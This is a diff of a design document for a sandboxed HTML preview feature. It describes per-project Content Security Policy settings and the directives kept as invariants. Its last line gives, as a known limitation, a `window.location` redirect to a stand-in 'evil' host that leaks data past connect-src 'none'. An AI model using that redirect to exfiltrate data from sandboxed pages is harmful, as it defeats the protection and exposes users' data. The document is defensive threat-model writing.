@@ -340,13 +340,14 @@ getting these headers is harmless (a `.js` file's own CSP does not govern its
 execution context — the embedding document's CSP does). MIME-branching the
 header logic is special-case insanity. Set it uniformly.
 
-> **⚠️ v1 deviation:** the strict CSP above is canonical, but v1 ships a
-> documented relaxation (external CDN allowlist + `unsafe-eval`) so real working
-> HTML depending on Tailwind/Alpine/Google Fonts can render. The non-negotiable
-> directives (`connect-src 'none'`, `img-src 'self' data:`, `default-src 'none'`,
-> no `allow-same-origin`) are unchanged and asserted as invariants. Full
-> rationale + the per-project configuration follow-up in
-> `docs/CRs/MDT-221/security-tradeoffs.md`.
+> **Per-project CSP configuration (TASK-14, shipped):** the strict CSP above is
+> the default. A project opts in to external CDNs and `unsafe-eval` via
+> `[project.document.preview]` in `.mdt-config.toml` (`allowedExternalDomains`,
+> `allowUnsafeEval`). The non-negotiable directives (`connect-src 'none'`,
+> `img-src 'self' data:`, `default-src 'none'`, no `allow-same-origin`) hold in
+> every configuration and are asserted as invariants. Full rationale in
+> `docs/CRs/MDT-221/security-tradeoffs.md`; config reference in
+> `docs/CONFIG_SPECIFICATION.md`.
 
 **Two unsolved limitations to call out as accepted v1 trade-offs** (not bugs):
 1. `connect-src 'none'` does not stop `window.location = 'https://evil/?...'`
